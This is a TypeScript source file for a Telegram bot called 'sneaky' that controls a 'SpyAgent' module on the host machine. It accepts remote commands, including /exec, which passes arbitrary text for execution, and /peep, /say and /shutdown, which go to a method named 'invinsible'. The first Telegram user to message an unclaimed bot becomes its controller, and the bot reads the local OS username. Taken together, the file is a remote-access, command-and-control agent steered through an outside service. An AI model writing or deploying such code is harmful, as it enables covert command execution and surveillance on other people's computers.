import { Telegraf } from 'telegraf';
import os from 'os';
import SpyAgent from './spyAgent';
import { Action, UserData } from './types';

/**
  * List of events to handle for graceful shutdown.
  * @type {string[]}
*/
const eventsToHandle: string[] = ['SIGTERM', 'SIGINT', 'unhandledRejection', 'uncaughtException', 'SIGUSR2'];


/**
 * Function to initialize and start the "sneaky" bot using Telegraf.
 * This bot listens for various commands, interacts with a SpyAgent,
 * and handles specific events such as shutdown signals.
 */
async function sneaky() {

    /**
     * Create a new instance of the Telegraf bot using the provided BOT_TOKEN.
     * @type {Telegraf}
     */
    const bot: Telegraf = new Telegraf(process.env.BOT_TOKEN!);


    /**
     * Create a SpyAgent instance to manage bot interactions.
     * @type {SpyAgent}
     */
    const agent: SpyAgent = new SpyAgent(bot);


    /**
     * Define a handler for the "/start" command.
    */
    bot.start((ctx) => {
        ctx.reply('Welcome sir,Wanna say Hello 😃?');
    });


    /**
     * Define handlers for the custom commands "/peep", "/say", "/shutdown", "/register", "/whoami", and "/exec".
     */
    bot.command('peep', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('+');
        const action: Action = {
            command: parts[0].trim(),
            text: parts[1]
        };
        agent.invinsible(action);
    });

    bot.command('say', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('+');
        const action: Action = {
            command: parts[0].trim(),
            text: parts[1]
        };
        agent.invinsible(action);
    });

    bot.command('shutdown', (ctx) => {
        const { message: { text } } = ctx.update;
        const action: Action = {
            command: text.trim()
        };
        agent.invinsible(action);
    });

    bot.command('register', async (ctx) => {
        try {
            const { message: { text } } = ctx.update;
            const parts = text?.split('+')[1]?.trim()?.split(',');
            const data: UserData = {
                name: parts[0],
                department: parts[1],
                title: parts[2],
                userId: ctx.from.id.toString(),
            };
            await agent.registerUser(data, ctx);
        }
        catch (err) {
            console.log(err);
        }
    });

    bot.command('whoami', (ctx) => {
        try {
            const user = agent.getUser();
            const quote = `Name:   ${user.name}\nDepartment:   ${user.department}\nTitle:   ${user.title}\n`;
            ctx.replyWithMarkdownV2(quote);
        }
        catch (err) {
            console.log(err);
        }
    });

    bot.command('exec', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('/exec: ')[1];
        agent.execCommand(parts);
    });


    /**
     * Handle incoming messages and perform actions based on the SpyAgent state.
     */
    bot.on('message', (ctx) => {
        if (agent.isAnonymous()) ctx.reply('agent007 at your service sir.')
        if (agent.isAnonymous()) agent.setUser = ctx.from.id.toString();
    });


    /**
     * Launch the Telegraf bot.
     */
    bot.launch();

    /**
     * If the SpyAgent is not anonymous, determine the current user using os.userInfo().
     */
    if (!agent.isAnonymous()) agent.whichUser(os.userInfo().username);


    /**
     * Register event handlers for graceful shutdown.
     */
    eventsToHandle.forEach((e) => process.on(e, (err) => {
        agent.die();
        console.log(err);
        return process.exit();
    }));


};

// Call the sneaky function to start the bot.
sneaky();